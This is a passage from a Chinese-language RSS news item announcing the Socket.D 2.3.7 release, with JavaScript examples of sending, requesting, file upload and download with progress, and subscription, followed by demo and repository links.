                }).<span style="color:#4078f2">doOnMessage</span>((s, m) -&gt; { <em>//收到任意消息时</em><em>//打印</em><span style="color:#986801">console</span>.<span style="color:#4078f2">info</span>(m);
                }).<span style="color:#4078f2">doOn</span>(<span style="color:#50a14f">"/demo"</span>, (s, m) -&gt; { <em>//收到"/demo"事件的消息时</em><span style="color:#a626a4">if</span> (m.<span style="color:#4078f2">isRequest</span>() || m.<span style="color:#4078f2">isSubscribe</span>()) {
                        <em>//答复</em>
                        s.<span style="color:#4078f2">replyEnd</span>(m, <span style="color:#c18401">SocketD</span>.<span style="color:#4078f2">newEntity</span>(<span style="color:#50a14f">"And you too."</span>));
                    }
                }))
        .<span style="color:#4078f2">open</span>();
</code></pre><ul><li>发送，和 发送文件（并获取进度）</li></ul><p style="color:#24292e; text-align:start">发送相对于 ws 多了元信息。可为数据添加额外的业务标注。发送大数据时，会自动分片（接收端自动聚合）</p><pre><code class="language-javascript"><em>//发送</em>
session.<span style="color:#4078f2">send</span>(<span style="color:#50a14f">"/demo/hello"</span>, <span style="color:#c18401">SocketD</span>.<span style="color:#4078f2">newEntity</span>(<span style="color:#50a14f">"hi"</span>).<span style="color:#4078f2">metaPut</span>(<span style="color:#50a14f">"sender"</span>,<span style="color:#50a14f">"noear"</span>));

<em>//发送文件，且获取发送进度（如果有大数据发送，又需要显示进度）//实际开发，要用 sendAndRequest 接口（以获取接收确认）</em>
session.<span style="color:#4078f2">send</span>(<span style="color:#50a14f">"/demo/upload"</span>, <span style="color:#c18401">SocketD</span>.<span style="color:#4078f2">newEntity</span>(file)).<span style="color:#4078f2">thenProgress</span>(<span>(<span>isSend, val, max</span>)=&gt;</span>{
    <span style="color:#a626a4">if</span>(isSend){
        <em>//获取发送进度</em><span style="color:#986801">console</span>.<span style="color:#4078f2">info</span>(<span style="color:#50a14f">`...<span style="color:#e45649">${val}</span>/<span style="color:#e45649">${max}</span>`</span>);
    }
});
</code></pre><ul><li>请求，和 下载文件（或大数据块）</li></ul><p style="color:#24292e; text-align:start">这个相当于 ws 有了 ajax 的交互方式</p><pre><code class="language-javascript"><em>//发送并请求（有点像 ajax）</em><span style="color:#a626a4">let</span> reply = session.<span style="color:#4078f2">sendAndRequest</span>(<span style="color:#50a14f">"/demo/hello"</span>, <span style="color:#c18401">SocketD</span>.<span style="color:#4078f2">newEntity</span>()).<span style="color:#4078f2">thenReply</span>(<span><span>reply</span>=&gt;</span>{
    <span style="color:#986801">console</span>.<span style="color:#4078f2">info</span>(reply.<span style="color:#4078f2">dataAsString</span>());
});

<em>//发送并请求，且取接收进度（如果有大数据获取，又需要显示进度）</em>
session.<span style="color:#4078f2">sendAndRequest</span>(<span style="color:#50a14f">"/demo/download"</span>, <span style="color:#c18401">SocketD</span>.<span style="color:#4078f2">newEntity</span>()).<span style="color:#4078f2">thenProgress</span>(<span>(<span>isSend, val, max</span>)=&gt;</span>{
    <span style="color:#a626a4">if</span>(!isSend){
        <em>//获取接收进度</em><span style="color:#986801">console</span>.<span style="color:#4078f2">info</span>(<span style="color:#50a14f">`...<span style="color:#e45649">${val}</span>/<span style="color:#e45649">${max}</span>`</span>);
    }
}).<span style="color:#4078f2">thenReply</span>(<span><span>reply</span>=&gt;</span>{
      <em>//reply.data()...</em>
}).<span style="color:#4078f2">thenError</span>(<span><span>err</span>=&gt;</span>{
      <em>//如果有出错？</em>
});
</code></pre><ul><li>订阅，与 流量控制（一般用于流加载）</li></ul><p style="color:#24292e; text-align:start">通过 range(start, size) 指定数据范围，由 sendAndSubscribe 发起订阅，通过 thenReply 多次接收。</p><pre><code class="language-javascript"><em>//发送并订阅</em><span style="color:#a626a4">let</span> entity = <span style="color:#c18401">SocketD</span>.<span style="color:#4078f2">newEntity</span>().<span style="color:#4078f2">range</span>(<span style="color:#986801">5</span>,<span style="color:#986801">5</span>).<span style="color:#4078f2">metaPut</span>(<span style="color:#50a14f">"videoId"</span>,<span style="color:#50a14f">"1"</span>);
session.<span style="color:#4078f2">sendAndSubscribe</span>(<span style="color:#50a14f">"/demo/stream"</span>, entity).<span style="color:#4078f2">thenReply</span>(<span><span>reply</span>=&gt;</span>{
      <em>//异步获取答复（会多次回调）</em>
})
</code></pre><h3>视频演示效果：</h3><ul><li>for H5 
  <ul><li><a href="https://www.oschina.net/action/GoToLink?url=https%3A%2F%2Fwww.bilibili.com%2Fvideo%2FBV1ck4y197BV%2F" target="_blank">https://www.bilibili.com/video/BV1ck4y197BV/</a></li><li><a href="https://gitee.com/noear/socket.d/tree/main/javascript/socketd-examples/demo01-js-ws">演示源码</a></li></ul></li><li>for UniAPP 
  <ul><li><a href="https://www.oschina.net/action/GoToLink?url=https%3A%2F%2Fwww.bilibili.com%2Fvideo%2FBV1T94y1T7sp%2F" target="_blank">https://www.bilibili.com/video/BV1T94y1T7sp/</a></li><li><a href="https://gitee.com/noear/socket.d/tree/main/javascript/socketd-examples/demo03-uniapp-ws">演示源码</a></li></ul></li></ul><h3>代码仓库：</h3><ul><li><a href="https://gitee.com/noear/socketd">https://gitee.com/noear/socketd</a></li><li><a href="https://www.oschina.net/action/GoToLink?url=https%3A%2F%2Fgithub.com%2Fnoear%2Fsocketd" target="_blank">https://github.com/noear/socketd</a></li></ul><h3>官网：</h3><ul><li><a href="https://www.oschina.net/action/GoToLink?url=https%3A%2F%2Fsocketd.noear.org%2F" target="_blank">https://socketd.noear.org</a></li></ul></div>
                                    ]]>
            </description>
            <pubDate>Mon, 22 Jan 2024 02:09:00 GMT</pubDate>
            <guid isPermaLink="false">https://www.oschina.net/news/276321/socketd-2-3-7-released</guid>
            <link>https://www.oschina.net/news/276321/socketd-2-3-7-released</link>
            <author>
                <![CDATA[来源: 投稿]]>
            </author>
        </item>
    </channel>
</rss>
